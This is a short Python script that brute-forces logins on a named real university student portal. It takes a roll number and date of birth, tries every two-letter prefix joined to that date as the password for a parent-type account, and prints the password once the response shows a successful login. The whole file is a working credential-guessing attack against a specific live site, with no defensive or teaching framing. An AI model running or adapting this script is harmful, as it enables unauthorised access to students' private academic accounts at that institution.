import sys
import requests
from bs4 import BeautifulSoup as bs

url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'
alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def connect(url, m_data):
	# print("requesting data:")
	resp = requests.post(url, data=m_data)
	# print("parsing data:")
	soup = bs(resp.text, 'html.parser')
	# print("checking data:")
	x = soup.find_all('frame')
	if(len(x) != 0):
		print("Password is " + m_data["Password"])
		sys.exit()
	# print("done")

def controller():
	roll_no = sys.argv[1]
	date_ob = sys.argv[2]
	length = len(alphabets) ** 2
	psswds = (M + D + date_ob for M in alphabets for D in alphabets)
	for i, psswd in enumerate(psswds):
		print(f'\rTrying {psswd} | {i + 1} of {length}', end='', flush=True)
		connect(url, {
			'UserType' : 'P',
			'MemberCode' : roll_no,
			'Password' : psswd
		})

controller()